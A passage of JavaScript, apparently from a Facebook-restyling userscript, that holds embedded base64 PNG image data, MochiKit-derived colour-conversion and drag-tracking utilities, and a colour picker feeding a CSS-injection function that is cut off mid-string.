     "OtEeAhkyQo6rnkCMmkiTrTUg3c7TMpvG0U4%2BUgs3AjZhzCRXSW%2F3DKHmoYN2neuiBKuPpr4JQNLUsZasdh7SYKHRCdrIscfe"+
     "kbkwTL1eApKYYgC54xq5YchrNVUxTASLDg7Tc5xYnTdOn%2FDW8GhiiJWsY6e3VlLJ3Kmpd0DaGJ5N%2FbxxzjJk9JFrQCYscLFX"+
     "4XMQIPiBADOVrHD4tKdCOGUI3c7AwmWaRhOnLFl9uCg8EQ9B4fE795Bxfkix90xgXcA2ir%2FvXcAyIGmHBxAm9j037jAUSWnLMc"+
     "R4yG4aOkwV9DYeHr3NEMpg56MIw8VxhCumXmLK6vAcdh4GKfv5527n9zUgKKmHBECQGHMhWXr%2BcQKH8efJRceKMFMr9pJzqYqw"+
     "gc46UDIHMl8gp%2BgwKWvMsk5OpB5CNTF6ySFcNIwHO8o5%2B3WAyHw3AoJ0oBRM3QtYDdXReAbyIIUaemcTM6SxITOkgZYaOntI"+
     "jr1s6uAxYr8CHVBhpC1n6jT13bmVvFPyenoJ6L5fLoY8idVzitBDjKkX8wpZbANaOGrS8gdt38KTwZ8FIKkQ5tEJokS1Z9W9cg8Z"+
     "R7gY0qWjkyZSzkNKX3ye%2Fb7vMkg5Bey8W%2Bs2IDlPwdykgFmeypI1Y0jRhdfmjUkVNLkKLE7XHjJjCMb3zpAce9ssq1k83sax"+
     "FacsErCtCdgLgHC3mOcpwwkGTSSL05YxdWZBqILQs0FmyPheDAfoSMp5iGdMj7Y0OsEi9vKoEbmxbwGQAdPx5591AQjCbW7sHtHU"+
     "nRxdSpbG3sGQMCyJYtUELJi7BSS4ha2CJmXVyBBJV6EY9u9bl7Pa4VEv6SmLezt49nves6WAlPj9GJ1wMbRcmHIiSpYx9Sr9XeVK"+
     "YRlQriWLTgP7zzIEIKMODOlsqtJKKjOkO0zwEBQCgoGh2S%2BUIX0Y37%2FfBkRZVCaLnvmiklU%2FnIk7Ux8xuO6hmV8yhMbvsb"+
     "FjImB0PSbAG4MjvJl6CIXgw%2BQHENLbh2S9BghF2yksMw9R6BjCAi9ZQ5YiF4Cq8CCN2xND%2Bpn6zENiMWxDxQAFzbLacJE8pN"+
     "K0t1C6ev7svB4jxyxZ51nJCpBQ8zhxudIHD0%2FjAssPXI6CjbjQ8z8CK8%2BxvI1DYu%2FcQ9pwcWeYsplTD5l6SDP1aO7a2zVz"+
     "nSH4ChANvMYtMBMpATJIVkHqIROGRFgiPL15eMlKsdcJWU0MobtOhDE2ZSUP6UN4NfVu7d1RCJCtheAuXWtAwjhEDqBckprnKdtD"+
     "xNQxGSCi39QDsfFbDCGwnIcMvtBPa%2F%2FpSFcnC3o7yR6ykZNEU5di2DPXe2wlERCSqglPrKl7EMagUCSrRokC5aooSyd%2Fxn"+
     "MJgtE5PCA%2B9sbRCZpdR7GqYuYqYdLUR02kITw1doFAJltj9nsa%2FuElXwfEB11o4z73N0kWM%2BYGQ4aHsKmPgXvwibH7Qbvf"+
     "c4LljEeIQ6Q2uWIPaVOsPn7vs9%2FzqjX29kcKaCJVAiDvPYHdBiTnq7qAZ%2BYoSbKYZ8KCEWmzh%2BhzbjPE5Cr1jAbFtmtTP%"+
     "2FZ7bfPddg%2B8THsXpt5nwDzZeustfgNPgh0g1kmWeUoFy8rXYE039Jlkcf4aQxJp6loM5wxRiw8egjw62eTRlLLaPb50tRFrjK"+
     "lDbg7SyZZpJS1trQDRJJVTlkZbdY1RARdMqZYhNHAH32VlYq92jQhIuHIM6VdaDIUvtVv9ELKqvb2bu9zy0KHgzCWz31uAjGGJzq"+
     "sAE1fVA5KHWCCYFZEhNN81HhJiLxBkqYqchWlv8BAzOtFiiDGMV2DOwAw5HcHWrb1%2Fl%2F4%2BmPIm8PQ7468BUQgiF0zXmLoF"+
     "QuWDjENihmrPqgkcSVl8iw8SMOYqw9S%2FJrGi8xDIiSFM7BVTb95Bf6QAuTkIb5YhK0B4MgUztZK9rf4AvV9kJVkMGjMkGbgzdf"+
     "WZnqtmgCQImC8CDYXgSgJWQ%2FaykqWTLQJGQ7Dp7TcACSxwcjSD4EKycqoyDBEPkWJIsdflKiCORaBDxs3yhXkwJGtTASORois%"+
     "2BD0Eydb71AcyQ8jIgOjoZ4hRSFtl4ELDIJRqpw5u6GPfcQ9CvJbReMMT1kC5RKfaOua8WQ5YsGaTQCfvZ20f83VrspQnw4MsrgJ"+
     "gwS48lmAwE3Dnc%2BDAyREfrgyFQMy%2FaQ%2Bg5JRl%2BACQwRH%2B6xUlX6iEiWRgWPxwlMiWGYK6JMla5BkR8QkfrCCUwPZpj"+
     "LwHxAkOsd%2Bx8awJoeRGX3sVeA0%2BY9iINFYNIudnv%2BDqY8uZHjRjSRY6yAiT5xAyCBScyEKn6iamP67pneEbjgLIACk%2F%"+
     "2BWRidxKYOdx1uJV1JFpl6SaMTuhdF%2BNKlCxqCDSDGxi0g%2BdGVhygzgkRZFsTmoR4iMK0YcukhwhCkpo4wyxpylnqI8RCMaW"+
     "8JgEQP2QYgOTNFQGbsqeFRx5c7kjVjyMxD2MBLSEuXgFgBo9HJpWQNuCr9LAMSGeIkqzhTn5n5TMAil9iikRf7iwyRlDX5WZlIlg"+
     "PCe0gYLs5MfSpZMow3HtI4UYgTGx3o0uz3BOYSkOpjL4rr5lO%2BqB9oynpeAzo4TBCod5QXGYIeYpcMuZSsIVwsUiNfVQGERo6j"+
     "lSBNtu4CogI2yVOWE1IBM1MCA8qSIfIV8%2BaBeYI6Xxlt%2B6aHIMyy5KdpstXcAjOGRIvXEPw6ICkYT3MVXpEsxxDt5uIh1M2j"+
     "jUN3%2F3UP4ZR1W7JKU%2FyQubKHlHY0S4D0ydZPAQJcG%2FcdD%2BEzDjH1Psui3Y8kR23H1x0XrqFgFTmcJXjumDqKcCLH3vI8"+
     "XioTU%2B9%2FGAr1kOEkF4D0zDXvGAsPqXPJsi5xgyGzdDUHJDkKT3ZlqnvPQyZNvZA4maYuvKnjRgjwFbeSFSCYlD7EGW1e7AxP"+
     "lKwq3oHBCb0aKSv5TGXORGAwib1WwOrEYSqqeEc%2FMQx8qSJgzfBpyBhGjnS8m2riHBCXkiYB14rU0swZgImpm5TF6Qq032Eibb"+
     "b46CEbQZemvXyTQzL3bTiL6%2B3IXvJcdLL4LmepJl4AMurisaMNILqgYXkB7d7FpCwnWVVYVB1PhofkzOXs2%2FUQcpT2rHQbED"+
     "82gi%2FF3trjgHgIwilJuznoVUCGWNVx%2B2hMUAveWA9RycqmPou2whdiSOBNKoYKiPUQTWJq8jXWRO0hqBceErzE9fZx7xbepD"+
     "Q6QHQyFZ1BoNNo20teconUP1BkwK67fvClsSebuWQvnWVdx97kEp0TKmjqHSH2HlafPYSBKAECvqrm6nVA1C0oEsfJVJhTTcycn8"+
     "2ewhZPTZ2WFcICmMWOrtOWv3rjRwrFq5Qlo5MwSMH4TimLOOH4YgGJo8IQbaGDwBsespSsYOrMEK2CKU9BZEmvZv4ikdbwJcVezH"+
     "oICRjkdIR7iJo69XeNxNRKen%2B%2FA0h6ROHxrlGoUau4Rc9QTqDv7Ro8BAjjRJIla9%2B4frQGk9%2Fouc7Uu0hZD6FRI5u6gS"+
     "fVxBUgqXdrJw%2FW7iBI4tQlLwsZD0L00dEqSHhC1yjRxvkOLK2J4dFNi%2BGYZek4EYEx3kOGqaMYc5fJ1jhNpIFjeRWQkKeQrT"+
     "p7SElGzhwA%2BcJUsjhX0fIi1DzA7%2F4yfzSkqhR7aYDS4aEgMBhkJlvJ3A9mKDzt%2Bz1AcsCFMWyxeuczAwIrWeFZJf%2FXly"+
     "4%2FI8OURUpj77bgS82xNxXCzhBoCB5jyQo6rjKmHuFhAXvDC4CYPIUyNfWw73sKIskKyamkxTYMkcVG2O%2FFiJSJvQwa23ac9t"+
     "IIUTkRhosMjzP1G4C8iYAZQAqKBSTEXhgI2MZz6YO37ThApJ8aRiB387TY0Eg7T1kyOtmycAV4OOiyhwyRiqZOM2AC5K2%2FgoHY"+
     "IiApVyGKVYi9tyEQi3%2Fhv8gFXHKiIHQMzHmzhXer574N3RwqZJU6y8ZAGg8ZKavG2S8PUjog7VN2D0QGJHMj%2Fix5CIGlklV1"+
     "ssXjkf7dL325DYGK0%2BQ5PDqhTt4ZEYthcJY%2BSMk1kb6fKWucjmAA0wPyBSDT7GQAWXsIFpJFr6HrPFonATvnu6nYXS29g4lG"+
     "J2GU0riQw29d8KVSQObvPfbidUAiENxD%2BGdYQyABN0tWNHVT%2FoBJBQyLjrzYroe42Eu7vYgMRbhsygoheKOsJd97V6GaiDFC"+
     "6RbvAAnMcI0j8aRfOw9hyRLoKo0N%2B3WYTGn%2B8eauvFEIjKmzbQfh01Asw0X%2BTjZeEYbxPWsVEqkegmNv%2F0lA5m7Bpn5h"+
     "0%2BeSCUxjoptMHXFwCA6zmKUsYUh4hROwipyvQg8JoFFvp9LIZl4nKes%2BIJyd7rkFR%2BIsUiJ5%2BkzzX5SsXBbZ4ldB1zPE"+
     "glYJtCK7naWoSxeH38CPYOoJmNBDksUzMBNAQtCNsRfZZyhXWXiMZHWJmkIQxAlmmac27k09eogCDDpTH%2FDwQVXiy8bwBgFrAF"+
     "Hs5cHjsPbbgMjejvadx%2BdlCY9IVoI2Li%2BQBiDIzmJTVmzquOEhkqt41JjTVoSA4AsCxrG3AUIWfwkIwik4XHZCkB4RqakYBc"+
     "maPGqHJQhng0Hkkj%2BklFaDS2S%2BVHmHmnrIeIeKUBODkG0iYN1ZvMUjjVUsIDElqX3nlKUewuPymWSFJQMyBBB9l8UGnHELp5"+
     "yAFdnfJTFE7kKhQQqBJTJHN9NR5uIYMCDoI3qSMTtWmQIikoPp0murMB4Slgq7kSwFQpbQiZW%2Fqk6y3HPSKyKI1YHXH60iZJVe"+
     "YQYpWhfV4um4aglICrx8cpHkjLKXW2AWDitZ4%2FWDVZqZIHsZab%2Fn55TJVeTUptCjEgeGHBUBZssDFXNV2Wfkasstvvf2eh%2"+
     "BQEHsnz%2FSArK96KMiSld3CsijudywYsq34Iq%2BpKfDSvMsCUpFOR2iZt9Dmq%2FxsDFI6ICxAziHQQ6dbXqDOPMRcmVQVfGLB"+
     "kIksAfVKnLJtJ4bUCXg1sapOr4a%2FUMoKV3KIpZOt57MmgDAnkEyZlxPRJ1zAnTAEwhXPiX5FDeZKpJDEqSxAqwHgKUNUwDQEE0"+
     "%2FGZ8pABcM1BgT1BUAST2zADUs92%2F36XPUMl6hiZirJERJfbjNkLHIN77u5qxB%2F5fwwh2BoEqv2qgvZPUC8cA1ZCjyZLLrP"+
     "T31%2FJ0aILFlHgKh%2BWUTj8YwIzJZBMw6zCcwhDPPjebIFGaEIPKmrnP%2B%2FrOeAxEW3i9zdIk%2Bvwu6n2GvZw0e4srCpVc"+
     "AuL%2Ba5ysVemJQ1Z0gCgvmQenuYbMXYO%2BBhAUst3gGSxiIX4gRZwAUEQXjQfwHo6YbvGjH2hiQ1bRwBmDp5TmKIPEeAGWMX10"+
     "pQffZieNhRgoBdAaJHSxNxwpIFQZRIhtCNWo1bMpNOcsnb3KJ7sNbPya%2BpSaxSU0923iAkww%2BxN9VE6ygMiFnsYe7SQ%2BZ%"+
     "2BEV0jccGZ93ynx708sfE4OqHsFERqHgPC%2BwlDDG9qkLUaLZ6ZYlrJKV1rQOKBat%2Bf1EPULUpYRhAL1GeqPj9kJBqxkywRQ2"+
     "K68sbt3WIuZBRPiTFRrGIYJp%2FJ0FS4fLYhHPNSNH4VEFrQMCoU%2BdBHww0LKe6W8GgJ4mICrnUEXEnW9NGaPKQmAav0DtU8ug"+
     "k8mwC8hRwW%2BfKzgHj7pkcjJyYCJu%2FDzpSTFOJ%2BD1A6hpQpQyq9zwuSJcvb9r%2FnCzf1OMv6GUC8P4h9a3935pwhCM%2Fg"+
     "XR%2B9g0Uqs0dgwlqysqkb2w4MkddsFq5s3MwGfafNRuNKUDT2fQmQiZFba5cix5IVe0eyfiNSyeI9BGVi%2BDU%2FGmUtMySejk"+
     "DnXbrkKlJRutTGvwLIDJYlXJSrUoRl66Te0bKblRy%2FvAy4hWcmZwkCXk7iD8vb8X8ZmGrkC9m3DhnH1zJyVRw8rgGpYtjaH9zS"+
     "dw%2BZ2TjD4ziwBGJu9cvn0NJvM9DuMERgYz8gyZLFF1DjeCVPhAXQBEhoHgYQyVM5V808ZLK%2FI3NWIlWDPMYFnRg2lgOVvhwT"+
     "hggXzIRrkqvkp4k3DpBKn7prnoqAVMpRDhBn2VMPyeNDF3hnPSQsOrCQLPsKXbKbpo7cSqp5xZYFbAHIYM8ApP2%2BcVgyaxUce5"+
     "2dLzmRJEtMvKQ8hMnux5IFU0CmLHIMkSUPMDm%2BVB1HtldQTI5tvmJm%2BAUWEOVL36UTLvTlnHAiP1ZMDCYQ%2B%2FJiutjxfa"+
     "xkWS9ipT%2B%2FGpN3bJpKVlvuIHlVXCc4ypcBkaVCWA51GN3DtpOnRYbs4iGTJfFnvryToBzMt8iuz5%2BxpXeXO1IExCBZKVdF"+
     "L%2FFXXwAkSU8%2B99PjprB3kZNTPgMnN3JOIn7jOOEYcgvCqWS5lGVZVBEmwdFDgtWbYcsVIBcQ6MHS5BUqP2WekTQCpCvynZUj"+
     "mOwW4alTIVsxJJm6il56TjVSR7KmFi9s0XhwDxDNNuoWxtSTh9jntKswYl91jOV%2BX10FIQtLt2BIMvkNYV4cXhG7iDSWnwAkSA"+
     "1SOoJReV78EvZgMT6jn%2B0zmHOUqUh5OTOPboFhKj2TlCWuUWnJyUPC95C5QhJbAxKXWReyLZI19ZHEdCdHt6he1hY9JHHMJykD"+
     "gQFEdn2JJTByIrLJSpaM5uN8WGqf5i1z5QHJUEAtWkeC2RHcWGS6vxH%2ByY4%2FvFQwC3pTsgKEM4ZkiRJTj5LlPSQGZZ0IB3iU"+
     "UwX7zC8iIJ4FszZepZ1Uy7T2bjC7FzeWF9cMib4wedeZjRdKUkay7LtnYNZ8qQK6ByRGWpOZ4PxBFhthJ2O6nLww8wVd7fcFIAtg"+
     "K%2F8GhhP8G9QocxY0qYn9J8qXBM8fAEgWucnCIcXL%2Fg70GRGCi6WfcGr9Ci84kSFh0rWSLMOpal5BQFq%2BbOEVCkgsdjN%2F"+
     "cLI2ax5h78IsByaydGO%2Fzxly4SFxC2zmUzo8WbLS7q8ibtv4nhiWABFgrgCJ%2FjBEKT03yVFOYFOrV6DjgtqUdYchlzBtE8mK"+
     "i60iExc7OhSJFL3bRMCuAammhdOUiZ4dihw%2FJ1bA0VHoOSUJhoM9LGTmRAe8msWty%2FeR4eKoiTmRyb%2BsujCc5Kwm2K2A%2"+
     "FQGAZJ8YXAj%2FcKR%2FuPsHw%2B3pBLdCuVreKYRZlGQHx0%2FZougZgDf5lE16zNcBMXaedZwXGwhWTf%2FU1DzCMuRFji7kIS"+
     "gvQlDNZ08Eh5YpL52RLEpSyUMCMGsBI0fp%2F0IDiLZou9gj6WQPMa4xRi8ukbkl1PdbmLoH5MVXyGKHn9bE3JTEQl8PsCdxq1Ow"+
     "VoDw3rWADMBMKnJmaWAq7C2TpStmsdMr%2BJNdnpqAtk0ZkgNukCXnISmXScoaImWCwxyQlIRwseRi6uGfhrRbYfZw3gQr%2B%2F"+
     "0yQ%2BxyFvuZji9ZsiSJGQirelQCRA6EMyDnglr3oPzjl3f4TPqnuv0dmTV5hyk8Nxly%2BWganUz5UtOj29zw8wiFYwD7VIDuCh"+
     "AvVixHdtFhrBTTBQT%2FU70cmSZzExBn6twb9N%2ByZNOMBVOpuhapnwLEdQzNZQvQ9F3M%2FuTm4eVI392NRebsGScXE0DDZxpx"+
     "CkmK42vYRPqcGrObAhLeZQGIvaLFAeICZnsE%2FDIgMEKflXzH7P5y4zmJIfPnjMwzh9TyOHgItxLimOPEFSA8LJk5ghY4ywLYfz"+
     "gwFxxcLtZU9G4udvzMapnrXrNNN0E1n1nN7%2Bzic2ZWlU29ACQ17SAbKl3CE%2FOPwFRiUjFcu4W%2Bw1yy0m87vQrvVxfvUO07"+
     "1MTKuoTQXHlAomAkQHRXcLSVX38WYctCMKygTQw%2F7c%2FLq0sP0d5tnktBQCCsZoNs4TepKBMIavpNPCCL%2FY74i1pZmnFKX1"+
     "lWnJjsd7wOCOt5ZsSUcVt2IW4l5nfeAoTyPlYILwGxIXaykHEPzpYD%2Bk8KjIiwLMXlCjSz2PrZc4bMF2niDGkT1LQJKupL8DAg"+
     "a06kfzjSHhSfMAsHzPaw8a2LhUwwGU6sN0HgsXbzCcfc8tbF6x0r6xKem4AUR%2BwkXeH1brfyabzbn3a%2FOyBeYMjkFZsP3hPw"+
     "6vIz6xRuM0N%2BHZBq8xD8viSmuL3nd3venyXvyLyQ1wK04ML6OSkz3fitN%2Ff7xKbueogMZOpLgMgvDk9l5yjhF0UOkDOG0Fh%"+
     "2FKk5u0S8B9UJG9%2FZefWa0evt71cXvVW3drMnB96lrTPdy2jnR1L2YZJGzUpiXF64T3GdI%2BozqXeySldtKGLOpO%2BmSz6jm"+
     "MxiQOC2a7r2JxHjNn0FIMeDGgvr97hfQc2qyow1HnUXP3yGIXZm7RljLzfarO4AYouPGcgAzu10xBLcW%2B4pTC9eZpazLd0%2Bg"+
     "Xb77WghfBOR6cTD5RevckSavmOr7LL3deoVjZZ28Yrb73Tbabr6iLn6vOv0MBcRF28VCzrOXlx%2BsesilNCz3%2B5wh812%2FkC"+
     "z%2FfvX2%2B20LYIOjJF2Kqr%2B7Rb%2Fee2Vu0JfLac9Q7nnIHUBWzkRBpeJLkOZes%2BRxvfh3ZUAmi35p0Qzh1eIkBb%2B3vL"+
     "jHosk%2FdVt8xtc3wfbCv3O78Rk3AUkWfb0cJgrPc1l9cfd%2FgSHL55QLaU7StV%2F%2Bzuk51T4nb3wfVJc0vQfhffJjCWm9gv"+
     "Q%2BINMWMdX3tW%2B9zsobSvQFQBSWV15x21IX%2Fwy8%2BIrt1r%2FkugndcUcF4pVXXANywwonfLncVcvl2F%2BC9GsMgTuzfP"+
     "kzzQ7f7nzmhfasAfmafNzh1LWl%2FtcAcuP9tj%2Fit7y50e4D8kLKenU5v7a8WH5KfQnCL24CvJYm%2F1mA%2FAEfewnIfz9Dvg"+
     "bI%2FrNr%2BccA8pOc%2Bqd85j8DkP2f%2F1v%2Bf2jmJBw1Fe8SAAAAAElFTkSuQmCC";
     
  // Here are some boring utility functions. The real code comes later.
  function hexToRgb(hex_string, default_){
    if (default_ == undefined)
        default_ = null;
    if (hex_string.substr(0, 1) == '#')
        hex_string = hex_string.substr(1);
    var r;
    var g;
    var b;
    if (hex_string.length == 3) {
      r = hex_string.substr(0, 1);
      r += r;
      g = hex_string.substr(1, 1);
      g += g;
      b = hex_string.substr(2, 1);
      b += b;
    } else if (hex_string.length == 6) {
      r = hex_string.substr(0, 2);
      g = hex_string.substr(2, 2);
      b = hex_string.substr(4, 2);
    } else {
      return default_;
    }
    r = parseInt(r, 16);
    g = parseInt(g, 16);
    b = parseInt(b, 16);
    if (isNaN(r) || isNaN(g) || isNaN(b))
      return default_;
    else
      return {r: r / 255, g: g / 255, b: b / 255};
  }
  
  function rgbToHex(r, g, b, includeHash) {
    r = Math.round(r * 255);
    g = Math.round(g * 255);
    b = Math.round(b * 255);
    if (includeHash == undefined)
      includeHash = true;
    r = r.toString(16);
    if (r.length == 1)
      r = '0' + r;
    g = g.toString(16);
    if (g.length == 1)
      g = '0' + g;
    b = b.toString(16);
    if (b.length == 1)
      b = '0' + b;
    return ((includeHash ? '#' : '') + r + g + b).toUpperCase();
  }
  
  var arVersion = navigator.appVersion.split("MSIE");
  var version = parseFloat(arVersion[1]);
  
  function fixPNG(myImage) {
    if ((version >= 5.5) && (version < 7) && (document.body.filters)) {
      var node = document.createElement('span');
      node.id = myImage.id;
      node.className = myImage.className;
      node.title = myImage.title;
      node.style.cssText = myImage.style.cssText;
      node.style.setAttribute('filter', "progid:DXImageTransform.Microsoft.AlphaImageLoader" + "(src=\'" + myImage.src + "\', sizingMethod='scale')");
      node.style.fontSize = '0';
      node.style.width = myImage.width.toString() + 'px';
      node.style.height = myImage.height.toString() + 'px';
      node.style.display = 'inline-block';
      return node;
    } else {
      return myImage.cloneNode(false);
    }
  }
  
  function trackDrag(node, handler) {
    function fixCoords(x, y) {
      var nodePageCoords = pageCoords(node);
      x = (x - nodePageCoords.x) + document.documentElement.scrollLeft;
      y = (y - nodePageCoords.y) + document.documentElement.scrollTop;
      if (x < 0) x = 0;
      if (y < 0) y = 0;
      if (x > node.offsetWidth - 1) x = node.offsetWidth - 1;
      if (y > node.offsetHeight - 1) y = node.offsetHeight - 1;
      return {x: x, y: y};
    }
    function mouseDown(ev) {
      var coords = fixCoords(ev.clientX, ev.clientY);
      var lastX = coords.x;
      var lastY = coords.y;
      handler(coords.x, coords.y);
      function moveHandler(ev) {
        var coords = fixCoords(ev.clientX, ev.clientY);
        if (coords.x != lastX || coords.y != lastY) {
          lastX = coords.x;
          lastY = coords.y;
          handler(coords.x, coords.y);
        }
      }
      function upHandler(ev) {
        myRemoveEventListener(document, 'mouseup', upHandler);
        myRemoveEventListener(document, 'mousemove', moveHandler);
        myAddEventListener(node, 'mousedown', mouseDown);
      }
      myAddEventListener(document, 'mouseup', upHandler);
      myAddEventListener(document, 'mousemove', moveHandler);
      myRemoveEventListener(node, 'mousedown', mouseDown);
      if (ev.preventDefault) ev.preventDefault();
    }
    myAddEventListener(node, 'mousedown', mouseDown);
    //node.onmousedown = function(e) { return false; };
    //node.onselectstart = function(e) { return false; };
    //node.ondragstart = function(e) { return false; };
  }
  
  var eventListeners = [];
  
  function findEventListener(node, event, handler) {
    var i;
    for (i in eventListeners)
      if (eventListeners[i].node == node && eventListeners[i].event == event && eventListeners[i].handler == handler)
        return i;
    return null;
  }
  
  function myAddEventListener(node, event, handler) {
    if (findEventListener(node, event, handler) != null)
      return;
    if (!node.addEventListener)
      node.attachEvent('on' + event, handler);
    else
      node.addEventListener(event, handler, false);
    eventListeners.push({node: node, event: event, handler: handler});
  }
  
  function removeEventListenerIndex(index) {
    var eventListener = eventListeners[index];
    delete eventListeners[index];
    if (!eventListener.node.removeEventListener)
      eventListener.node.detachEvent('on' + eventListener.event, eventListener.handler);
    else
      eventListener.node.removeEventListener(eventListener.event, eventListener.handler, false);
  }
  
  function myRemoveEventListener(node, event, handler) {
    removeEventListenerIndex(findEventListener(node, event, handler));
  }
  function cleanupEventListeners() {
    var i;
    for (i = eventListeners.length; i > 0; i--)
      if (eventListeners[i] != undefined)
        removeEventListenerIndex(i);
  }
  
  myAddEventListener(window, 'unload', cleanupEventListeners);
  
  // This copyright statement applies to the following two functions,
  // which are taken from MochiKit.
  //
  // Copyright 2005 Bob Ippolito <bob@redivi.com>
  //
  // Permission is hereby granted, free of charge, to any person obtaining
  // a copy of this software and associated documentation files (the
  // \"Software\"), to deal in the Software without restriction, including
  // without limitation the rights to use, copy, modify, merge, publish,
  // distribute, sublicense, and/or sell copies of the Software, and to
  // permit persons to whom the Software is furnished to do so, subject
  // to the following conditions:
  //
  // The above copyright notice and this permission notice shall be
  // included in all copies or substantial portions of the Software.
  // 
  // THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,
  // EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
  // MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
  // NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS
  // BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
  // ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
  // CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
  
  function hsvToRgb(hue, saturation, value) {
    var red;
    var green;
    var blue;
    if (value == 0.0) {
      red = 0;
      green = 0;
      blue = 0;
    } else {
      var i = Math.floor(hue * 6);
      var f = (hue * 6) - i;
      var p = value * (1 - saturation);
      var q = value * (1 - (saturation * f));
      var t = value * (1 - (saturation * (1 - f)));
      switch (i) {
        case 1: red = q; green = value; blue = p; break;
        case 2: red = p; green = value; blue = t; break;
        case 3: red = p; green = q; blue = value; break;
        case 4: red = t; green = p; blue = value; break;
        case 5: red = value; green = p; blue = q; break;
        case 6: // fall through
        case 0: red = value; green = t; blue = p; break;
      }
    }
    return {r: red, g: green, b: blue};
  }
  
  function rgbToHsv(red, green, blue) {
    var max = Math.max(Math.max(red, green), blue);
    var min = Math.min(Math.min(red, green), blue);
    var hue;
    var saturation;
    var value = max;
    if (min == max) {
      hue = 0;
      saturation = 0;
    } else {
      var delta = (max - min);
      saturation = delta / max;
      if (red == max)
        hue = (green - blue) / delta;
      else if (green == max)
        hue = 2 + ((blue - red) / delta);
      else
        hue = 4 + ((red - green) / delta);
      hue /= 6;
      if (hue < 0) hue += 1;
      if (hue > 1) hue -= 1;
    }
    return {
      h: hue,
      s: saturation,
      v: value
    };
  }
  function pageCoords(node) {
    var x = node.offsetLeft;
    var y = node.offsetTop;
    var parent = node.offsetParent;
    while (parent != null) {
      x += parent.offsetLeft;
      y += parent.offsetTop;
      parent = parent.offsetParent;
    }
    return {x: x, y: y};
  }
  
  // The real code begins here.
  var huePositionImg = document.createElement('img');
  huePositionImg.galleryImg = false;
  huePositionImg.width = 35;
  huePositionImg.height = 11;
  huePositionImg.src = HUE_SLIDER_ARROWS_LOCATION;
  huePositionImg.style.position = 'absolute';
  var hueSelectorImg = document.createElement('img');
  hueSelectorImg.galleryImg = false;
  hueSelectorImg.width = 35;
  hueSelectorImg.height = 200;
  hueSelectorImg.src = HUE_SLIDER_LOCATION;
  hueSelectorImg.style.display = 'block';
  var satValImg = document.createElement('img');
  satValImg.galleryImg = false;
  satValImg.width = 200;
  satValImg.height = 200;
  satValImg.src = SAT_VAL_SQUARE_LOCATION;
  satValImg.style.display = 'block';
  var crossHairsImg = document.createElement('img');
  crossHairsImg.galleryImg = false;
  crossHairsImg.width = 21;
  crossHairsImg.height = 21;
  crossHairsImg.src = CROSSHAIRS_LOCATION;
  crossHairsImg.style.position = 'absolute';
  
  function makeColorSelector(inputBox) {
    var rgb, hsv
    function colorChanged() {
      var hex = rgbToHex(rgb.r, rgb.g, rgb.b);
      var hueRgb = hsvToRgb(hsv.h, 1, 1);
      var hueHex = rgbToHex(hueRgb.r, hueRgb.g, hueRgb.b);
      previewDiv.style.background = hex;
      inputBox.value = hex;
      satValDiv.style.background = hueHex;
      crossHairs.style.left = ((hsv.v*199)-10).toString() + 'px';
      crossHairs.style.top = (((1-hsv.s)*199)-10).toString() + 'px';
      huePos.style.top = ((hsv.h*199)-5).toString() + 'px';
    }
    function rgbChanged() {
      hsv = rgbToHsv(rgb.r, rgb.g, rgb.b);
      colorChanged();
    }
    function hsvChanged() {
      rgb = hsvToRgb(hsv.h, hsv.s, hsv.v);
      colorChanged();
    }
    var colorSelectorDiv = document.createElement('div');
    colorSelectorDiv.style.padding = '15px';
    colorSelectorDiv.style.position = 'relative';
    colorSelectorDiv.style.height = '275px';
    colorSelectorDiv.style.width = '250px';
    var satValDiv = document.createElement('div');
    satValDiv.style.position = 'relative';
    satValDiv.style.width = '200px';
    satValDiv.style.height = '200px';
    var newSatValImg = fixPNG(satValImg);
    satValDiv.appendChild(newSatValImg);
    var crossHairs = crossHairsImg.cloneNode(false);
    satValDiv.appendChild(crossHairs);
    function satValDragged(x, y) {
      hsv.s = 1-(y/199);
      hsv.v = (x/199);
      hsvChanged();
    }
    trackDrag(satValDiv, satValDragged)
    colorSelectorDiv.appendChild(satValDiv);
    var hueDiv = document.createElement('div');
    hueDiv.style.position = 'absolute';
    hueDiv.style.left = '230px';
    hueDiv.style.top = '15px';
    hueDiv.style.width = '35px';
    hueDiv.style.height = '200px';
    var huePos = fixPNG(huePositionImg);
    hueDiv.appendChild(hueSelectorImg.cloneNode(false));
    hueDiv.appendChild(huePos);
    function hueDragged(x, y) {
      hsv.h = y/199;
      hsvChanged();
    }
    trackDrag(hueDiv, hueDragged);
    colorSelectorDiv.appendChild(hueDiv);
    var previewDiv = document.createElement('div');
    previewDiv.style.height = '50px'
    previewDiv.style.width = '50px';
    previewDiv.style.position = 'absolute';
    previewDiv.style.top = '225px';
    previewDiv.style.left = '15px';
    previewDiv.style.border = '1px solid black';
    colorSelectorDiv.appendChild(previewDiv);
    function inputBoxChanged() {
      rgb = hexToRgb(inputBox.value, {r: 0, g: 0, b: 0});
      rgbChanged();
    }
    myAddEventListener(inputBox, 'change', inputBoxChanged);
    inputBox.size = 8;
    inputBox.style.position = 'absolute';
    inputBox.style.right = '15px';
    inputBox.style.top = (225 + (25 - (inputBox.offsetHeight/2))).toString() + 'px';
    colorSelectorDiv.appendChild(inputBox);
    inputBoxChanged();
    return colorSelectorDiv;
  }
  /** End of code that's not written by me. **/

  (node=document.getElementById("colour1").getElementsByTagName("input")[0]).parentNode.insertBefore(makeColorSelector(node), null);
  (node=document.getElementById("colour2").getElementsByTagName("input")[0]).parentNode.insertBefore(makeColorSelector(node), null);
}

function addStyle(setup) {
  if (!setup.colour1 && !setup.colour2)
    setup = eval('({colour1:"#3b5998", colour2:"#6d84b4"})');

  style = document.getElementsByTagName('head')[0].appendChild(document.createElement('style'));
  style.type = 'text/css';
  style.innerHTML = ".groupProfileHeader .fsxl {" +
                  "    color: #1C2A47;" +
                  "}" +
                  ".groups_highlight_box {" +
                  "    color: #535353;" +
                  "}" +
                  ".uiComposer .attachmentFrame {" +
                  "    border-color: #B4BBCD #B4BBCD #CCCCCC;" +
                  "}" +
